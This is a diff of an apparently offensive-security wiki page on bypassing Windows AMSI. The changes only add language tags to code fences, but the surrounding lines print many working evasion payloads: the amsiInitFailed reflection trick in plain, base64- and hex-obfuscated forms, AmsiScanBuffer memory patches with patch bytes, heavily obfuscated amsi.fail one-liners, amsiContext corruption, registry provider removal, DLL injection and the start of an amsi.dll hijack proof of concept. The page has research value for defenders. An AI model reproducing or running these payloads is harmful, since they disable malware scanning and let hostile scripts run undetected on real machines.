@@ -48,13 +48,13 @@ Fabian Mosch used an old AMSI bypass of Matt Graeber to prove that if base64 enc
 
 #### <mark style="color:green;">**Original AMSI Bypass**</mark>
 
-```
+```powershell
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 ```
 
 #### <mark style="color:green;">**Base64 Encoded**</mark>
 
-```
+```powershell
 [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
 ```
 
@@ -66,7 +66,7 @@ Tom Carver created a proof of concept in the form of a DLL file which evades AMS
 
 {% embed url="https://github.com/tomcarver16/SimpleInjector" %}
 
-```
+```powershell
 .\SimpleInjector.exe powershell.exe .\AmsiHook.dll
 ```
 
@@ -76,13 +76,13 @@ Tom Carver created a proof of concept in the form of a DLL file which evades AMS
 
 Daniel Duggan released an [AMSI bypass](https://github.com/rasta-mouse/AmsiScanBufferBypass) which patches the AmsiScanBuffer() function in order to return always **AMSI\_RESULT\_CLEAN** which indicates that no detection has been found. The patch is displayed in the following line:
 
-```
+```powershell
 static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
 ```
 
 The bypass has been released in C# and PowerShell. The DLL can be loaded and executed with the use of the following commands:
 
-```
+```powershell
 [System.Reflection.Assembly]::LoadFile("C:\Users\pentestlab\ASBBypass.dll")
 [Amsi]::Bypass()
 ```
@@ -99,7 +99,7 @@ By default the PowerShell version is getting flagged. The [AMSITrigger](https://
 
 Obfuscating the code contained within the PowerShell script will evade AMSI and perform the memory patching.
 
-```
+```powershell
 ${_/==\_/\__/===\_/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGkAbgBnACAAUwB5AHMAdABlAG0AOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwANAAoAcAB1AGIAbABpAGMAIABjAGwAYQBzAHMAIABXAGkAbgAzADIAIAB7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAoAEkAbgB0AFAAdAByACAAaABNAG8AZAB1AGwAZQAsACAAcwB0AHIAaQBuAGcAIABwAHIAbwBjAE4AYQBtAGUAKQA7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEwAbwBhAGQATABpAGIAcgBhAHIAeQAoAHMAdAByAGkAbgBnACAAbgBhAG0AZQApADsADQAKACAAIAAgACAAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyACIAKQBdAA0ACgAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGIAbwBvAGwAIABWAGkAcgB0AHUAYQBsAFAAcgBvAHQAZQBjAHQAKABJAG4AdABQAHQAcgAgAGwAcABBAGQAZAByAGUAcwBzACwAIABVAEkAbgB0AFAAdAByACAAZAB3AFMAaQB6AGUALAAgAHUAaQBuAHQAIABmAGwATgBlAHcAUAByAG8AdABlAGMAdAAsACAAbwB1AHQAIAB1AGkAbgB0ACAAbABwAGYAbABPAGwAZABQAHIAbwB0AGUAYwB0ACkAOwANAAoAfQA=')))
 Add-Type ${_/==\_/\__/===\_/}
 ${__/=\/==\/\_/=\_/} = [Win32]::LoadLibrary("am" + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBpAC4AZABsAGwA'))))
@@ -132,13 +132,13 @@ An alternative [bypass](https://www.contextis.com/us/blog/amsi-bypass) was relea
 
 Forcing the AMSI initialization to fail (amsiInitFailed) will result that no scan will be initiated for the current process. Originally this was disclosed by [Matt Graeber](https://twitter.com/mattifestation) and Microsoft has developed a signature to prevent wider usage.
 
-```
+```powershell
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 ```
 
 Avoiding to use directly the strings with the usage of variables can evade AMSI with the same method.
 
-```
+```powershell
 $w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
 $assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
 $field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
@@ -149,7 +149,7 @@ $field.SetValue($null,$true)
 
 Since there is a signature for the “amsiInitFailed” flag, [Adam Chester](https://twitter.com/\_xpn\_) discovered an alternative method which attempt to force a error in order the flag to be set in a legitimate way and not in the console. This bypass allocates a memory region for the “amsiContext” and since the “amsiSession” is set to null will result an error. The discovery has been described in the article “[Exploring PowerShell AMSI and Logging Evasion](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/)” in the MDSec website. Using this evasion without any obfuscation will fail as Microsoft has created signatures.
 
-```
+```powershell
 $mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
 [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)
 [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);
@@ -157,8 +157,7 @@ $mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
 
 However an obfuscated version of this bypass exists in the [amsi.fail](https://amsi.fail) website which is maintained by [Melvin Langvik](https://twitter.com/Flangvik) and is displayed also below:
 
-```
-	
+```powershell
 $fwi=[System.Runtime.InteropServices.Marshal]::AllocHGlobal((9076+8092-8092));[Ref].Assembly.GetType("System.Management.Automation.$([cHAr](65)+[cHaR]([byTe]0x6d)+[ChaR]([ByTe]0x73)+[CHaR]([BYte]0x69)+[CHaR](85*31/31)+[cHAR]([byte]0x74)+[cHAR](105)+[cHar](108)+[Char](115+39-39))").GetField("$('àmsìSessîõn'.NoRMALiZe([char](70+54-54)+[cHaR](111)+[cHar](114+24-24)+[chaR](106+3)+[chAR](68+26-26)) -replace [CHAR](24+68)+[chaR]([BytE]0x70)+[CHar]([bYtE]0x7b)+[cHAr](77+45-45)+[chaR](62+48)+[CHAR](125*118/118))", "NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.$([cHAr](65)+[cHaR]([byTe]0x6d)+[ChaR]([ByTe]0x73)+[CHaR]([BYte]0x69)+[CHaR](85*31/31)+[cHAR]([byte]0x74)+[cHAR](105)+[cHar](108)+[Char](115+39-39))").GetField("$([char]([bYtE]0x61)+[ChaR]([BYte]0x6d)+[Char](55+60)+[chAr](105+97-97)+[CHAr]([byTe]0x43)+[ChaR](111+67-67)+[char]([BytE]0x6e)+[cHaR]([bYtE]0x74)+[cHAr](101)+[CHar](120)+[cHAR](116))", "NonPublic,Static").SetValue($null, [IntPtr]$fwi);
 ```
 
@@ -186,7 +185,7 @@ Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-9
 
 DLL Hijacking can be also used to evade AMSI from userland as it has been described by [SensePost](https://sensepost.com/blog/2020/resurrecting-an-old-amsi-bypass/). The only requirement is to create a non-legitimate amsi.dll file and plant it on the same folder as PowerShell 64 bit which could be copied to a user writable directory. The proof of concept code has been released by SensePost and is also demonstrated below.
 
-```
+```cpp
 #include "pch.h"
 #include "iostream"
  
@@ -251,19 +250,19 @@ Executing PowerShell outside of the standard directory will load the amsi.dll fi
 
 
 
-```
+```powershell
 [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
 ```
 
-```
+```powershell
 [Ref].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)
 ```
 
-```
+```powershell
 [Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)
 ```
 
-```
+```powershell
 $Win32 = @"
 
 using System;
@@ -293,7 +292,7 @@ $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
 [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
 ```
 
-```
+```powershell
 #Rasta-mouses Amsi-Scan-Buffer patch \n
 $jkgdk = @"
 using System;
